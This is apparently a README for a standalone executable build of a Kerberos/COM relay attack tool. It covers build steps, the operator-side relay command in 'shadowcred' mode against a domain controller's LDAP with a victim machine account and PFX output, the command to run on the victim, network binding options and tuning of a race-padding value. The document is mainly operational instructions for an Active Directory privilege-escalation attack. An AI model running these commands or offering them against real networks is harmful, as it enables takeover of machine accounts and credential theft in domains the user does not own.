# Standalone exe build

This directory holds a standalone executable build of the COM coercion client.
It uses the same coercion and KRB1 bridge as `bof/krbrelay.c`, built as an exe
instead of a BOF. It pairs with the padded-race `relay/relay_server.py` on this
branch, which tracks upstream `main`.

The exe keeps the upstream coercion path (`RPC_C_AUTHN_GSS_NEGOTIATE`, default
auth level). It adds one diagnostic line. That line prints the relayed auth
type, auth level, and first token byte. You can read the context the DC receives.

## Build

```
cd standalone
./build.sh
```

This needs x64 MinGW-w64 and produces `krbrelay.exe` in this directory.

## Run

Start the relay on the operator host:

```
python3 relay/relay_server.py shadowcred \
  --port 9008 \
  --ldap-host DC01.example.test --ldap-address 10.0.0.11 --ldap-port 389 \
  --domain example.test --machine VICTIM \
  --target-dn "CN=VICTIM,OU=Workstations,DC=example,DC=test" \
  --pfx-out victim.pfx --padding-count 2
```

Run the exe on the victim:

```
krbrelay.exe <relay_ip> 9008 ldap/DC01.example.test 127.0.0.1 7989 <trigger_clsid>
```

Positional arguments: relay address, relay port, service SPN, RPC host
(127.0.0.1), RPC endpoint port, trigger CLSID.

## Transport

The relay binds 127.0.0.1 by default, for the BOF `rportfwd_local` model. The
standalone exe connects to the relay over the network. If the exe connects
directly to the operator host, start the relay with `--listen-address 0.0.0.0`
or a specific interface address. When `--listen-address` is not loopback, the
relay accepts a non-loopback peer.

## Padding

`--padding-count` sets the race padding. The author reports a working range of
about 2 to 100. Start at 2. If the write returns result=1, raise it. Too much
padding fails the same way, so do not exceed about 100.
